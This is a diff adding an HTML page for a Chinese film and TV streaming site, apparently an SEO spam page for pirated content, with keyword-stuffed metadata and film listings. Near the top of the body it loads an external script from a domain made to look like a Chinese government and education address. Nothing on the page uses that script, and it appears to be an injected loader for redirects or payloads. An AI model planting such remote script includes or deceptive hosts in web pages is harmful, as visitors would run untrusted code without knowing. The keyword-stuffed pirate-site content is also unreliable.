@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>av天堂电影网 - 高清影视在线观看</title>
+<meta name="description" content="av天堂电影网（avtiantangdianyingwang-top）提供最新电影、热播剧集、综艺动漫在线观看，高清流畅，每日更新。">
+<meta name="keywords" content="av天堂电影网, avtiantangdianyingwang-top, 电影, 在线观看, 高清影视">
+<meta name="author" content="av天堂电影网">
+<meta name="robots" content="index, follow">
+<!-- 必应站长工具验证（示例，请替换为您自己的） -->
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE" />
+
+<style>
+/* ===== 全局样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    color: #e0e0e0;
+    line-height: 1.6;
+}
+
+a {
+    color: #ff6b6b;
+    text-decoration: none;
+    transition: color 0.3s;
+}
+
+a:hover {
+    color: #ffd93d;
+}
+
+/* ===== 导航栏 ===== */
+.navbar {
+    position: fixed;
+    top: 0;
+    width: 100%;
+    background: rgba(15, 12, 41, 0.95);
+    backdrop-filter: blur(10px);
+    z-index: 1000;
+    padding: 1rem 2rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.nav-logo {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: #ff6b6b;
+}
+
+.nav-links {
+    display: flex;
+    gap: 1.5rem;
+}
+
+.nav-links a {
+    color: #ccc;
+    font-size: 0.95rem;
+}
+
+.nav-links a:hover {
+    color: #ffd93d;
+}
+
+/* 移动端菜单按钮 */
+.menu-toggle {
+    display: none;
+    flex-direction: column;
+    cursor: pointer;
+}
+
+.menu-toggle span {
+    height: 2px;
+    width: 25px;
+    background: #fff;
+    margin: 4px 0;
+    border-radius: 2px;
+}
+
+/* ===== 主视觉 ===== */
+.hero {
+    margin-top: 80px;
+    padding: 4rem 2rem;
+    text-align: center;
+    background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400"><rect fill="%2324233e" width="800" height="400"/><circle cx="200" cy="200" r="150" fill="%23302b63" opacity="0.3"/><circle cx="600" cy="150" r="100" fill="%230f0c29" opacity="0.4"/></svg>') no-repeat center/cover;
+}
+
+.hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    color: #fff;
+}
+
+.hero p {
+    font-size: 1.1rem;
+    max-width: 600px;
+    margin: 0 auto 2rem;
+    color: #bbb;
+}
+
+.btn-primary {
+    display: inline-block;
+    padding: 0.8rem 2rem;
+    background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+    color: #000;
+    border-radius: 30px;
+    font-weight: bold;
+    transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.btn-primary:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
+}
+
+/* ===== 栏目通用 ===== */
+.section {
+    padding: 4rem 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.section-title {
+    text-align: center;
+    font-size: 2rem;
+    margin-bottom: 3rem;
+    color: #ffd93d;
+}
+
+/* ===== 电影/剧集网格 ===== */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 2rem;
+}
+
+.card {
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 10px;
+    overflow: hidden;
+    transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+}
+
+.card-img {
+    width: 100%;
+    height: 280px;
+    background: linear-gradient(45deg, #302b63, #0f0c29);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #666;
+    font-size: 0.9rem;
+}
+
+.card-body {
+    padding: 1rem;
+}
+
+.card-title {
+    font-size: 1rem;
+    margin-bottom: 0.5rem;
+    color: #fff;
+}
+
+.card-meta {
+    font-size: 0.8rem;
+    color: #999;
+}
+
+/* ===== 排行榜 ===== */
+.rank-list {
+    list-style: none;
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+.rank-item {
+    display: flex;
+    align-items: center;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 8px;
+}
+
+.rank-num {
+    font-size: 1.5rem;
+    font-weight: bold;
+    color: #ff6b6b;
+    margin-right: 1.5rem;
+    min-width: 40px;
+}
+
+.rank-info h3 {
+    color: #fff;
+    margin-bottom: 0.3rem;
+}
+
+.rank-info p {
+    color: #aaa;
+    font-size: 0.9rem;
+}
+
+/* ===== 关于 ===== */
+.about-content {
+    max-width: 800px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.about-content p {
+    margin-bottom: 1.5rem;
+    color: #bbb;
+}
+
+.domain-box {
+    background: rgba(255, 107, 107, 0.1);
+    border: 1px solid rgba(255, 107, 107, 0.3);
+    padding: 1rem;
+    border-radius: 8px;
+    margin: 2rem 0;
+    font-family: monospace;
+    color: #ffd93d;
+}
+
+/* ===== 页脚 ===== */
+.footer {
+    text-align: center;
+    padding: 2rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    color: #666;
+    font-size: 0.9rem;
+}
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .nav-links {
+        display: none;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        width: 100%;
+        background: rgba(15, 12, 41, 0.98);
+        flex-direction: column;
+        padding: 1rem 0;
+        text-align: center;
+    }
+
+    .nav-links.active {
+        display: flex;
+    }
+
+    .menu-toggle {
+        display: flex;
+    }
+
+    .hero h1 {
+        font-size: 2rem;
+    }
+
+    .section {
+        padding: 3rem 1rem;
+    }
+
+    .grid {
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 1rem;
+    }
+
+    .card-img {
+        height: 200px;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<nav class="navbar">
+    <div class="nav-logo">av天堂电影网</div>
+    <div class="menu-toggle" onclick="toggleMenu()">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+    <div class="nav-links" id="navLinks">
+        <a href="#home">首页</a>
+        <a href="#movies">电影</a>
+        <a href="#series">剧集</a>
+        <a href="#ranking">排行</a>
+        <a href="#about">关于</a>
+    </div>
+</nav>
+
+<!-- 首页 -->
+<section class="hero" id="home">
+    <h1>av天堂电影网</h1>
+    <p>您的专属高清影视乐园，海量电影、热播剧集、综艺动漫每日更新，畅享极致观影体验。</p>
+    <a href="#movies" class="btn-primary">立即观影</a>
+</section>
+
+<!-- 电影栏目 -->
+<section class="section" id="movies">
+    <h2 class="section-title">🎬 最新电影</h2>
+    <div class="grid">
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">沙丘2</div>
+                <div class="card-meta">科幻 / 2024 / 9.2分</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">奥本海默</div>
+                <div class="card-meta">传记 / 2023 / 8.8分</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">哥斯拉大战金刚2</div>
+                <div class="card-meta">动作 / 2024 / 7.5分</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">坠落的审判</div>
+                <div class="card-meta">悬疑 / 2023 / 8.5分</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 剧集栏目 -->
+<section class="section" id="series" style="background: rgba(0,0,0,0.2);">
+    <h2 class="section-title">📺 热播剧集</h2>
+    <div class="grid">
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">繁花</div>
+                <div class="card-meta">剧情 / 30集 / 8.7分</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">庆余年2</div>
+                <div class="card-meta">古装 / 待播 / 期待值99%</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">三体</div>
+                <div class="card-meta">科幻 / 30集 / 8.9分</div>
+            </div>
+        </div>
+        <div class="card">
+            <div class="card-img">海报加载中...</div>
+            <div class="card-body">
+                <div class="card-title">狂飙</div>
+                <div class="card-meta">犯罪 / 39集 / 8.9分</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="section" id="ranking">
+    <h2 class="section-title">🔥 热门排行</h2>
+    <ul class="rank-list">
+        <li class="rank-item">
+            <div class="rank-num">1</div>
+            <div class="rank-info">
+                <h3>周处除三害</h3>
+                <p>动作 / 犯罪 / 9.0分</p>
+            </div>
+        </li>
+        <li class="rank-item">
+            <div class="rank-num">2</div>
+            <div class="rank-info">
+                <h3>飞驰人生2</h3>
+                <p>喜剧 / 运动 / 8.2分</p>
+            </div>
+        </li>
+        <li class="rank-item">
+            <div class="rank-num">3</div>
+            <div class="rank-info">
+                <h3>热辣滚烫</h3>
+                <p>剧情 / 喜剧 / 7.9分</p>
+            </div>
+        </li>
+        <li class="rank-item">
+            <div class="rank-num">4</div>
+            <div class="rank-info">
+                <h3>第二十条</h3>
+                <p>剧情 / 家庭 / 7.8分</p>
+            </div>
+        </li>
+        <li class="rank-item">
+            <div class="rank-num">5</div>
+            <div class="rank-info">
+                <h3>年会不能停！</h3>
+                <p>喜剧 / 职场 / 8.1分</p>
+            </div>
+        </li>
+    </ul>
+</section>
+
+<!-- 关于 -->
+<section class="section" id="about" style="background: rgba(0,0,0,0.2);">
+    <h2 class="section-title">ℹ️ 关于我们</h2>
+    <div class="about-content">
+        <p><strong>av天堂电影网</strong>是一个专注于高清影视资源分享的平台，致力于为用户提供最新、最全的电影、剧集、综艺和动漫内容。</p>
+        <p>我们每日更新热门影视，支持多清晰度播放，让您随时随地享受影院级体验。</p>
+        
+        <div class="domain-box">
+            🌐 网站地址：https://avtiantangdianyingwang-top
+        </div>
+        
+        <p>关键词：av天堂电影网、avtiantangdianyingwang-top、高清电影、在线观看、最新影视</p>
+        <p>如有任何问题或建议，欢迎通过网站内反馈渠道联系我们。</p>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+    <p>© 2024 av天堂电影网 (avtiantangdianyingwang-top) 版权所有</p>
+    <p style="margin-top: 0.5rem; color: #444;">本站仅提供影视信息展示，所有资源来自互联网，如有侵权请联系删除。</p>
+</footer>
+
+<script>
+/* 移动端菜单切换 */
+function toggleMenu() {
+    const navLinks = document.getElementById('navLinks');
+    navLinks.classList.toggle('active');
+}
+
+/* 平滑滚动 */
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+            // 关闭移动端菜单
+            document.getElementById('navLinks').classList.remove('active');
+        }
+    });
+});
+
+/* 导航栏滚动效果 */
+window.addEventListener('scroll', () => {
+    const navbar = document.querySelector('.navbar');
+    if (window.scrollY > 50) {
+        navbar.style.background = 'rgba(15, 12, 41, 0.98)';
+    } else {
+        navbar.style.background = 'rgba(15, 12, 41, 0.95)';
+    }
+});
+</script>
+
+</body>
+</html>
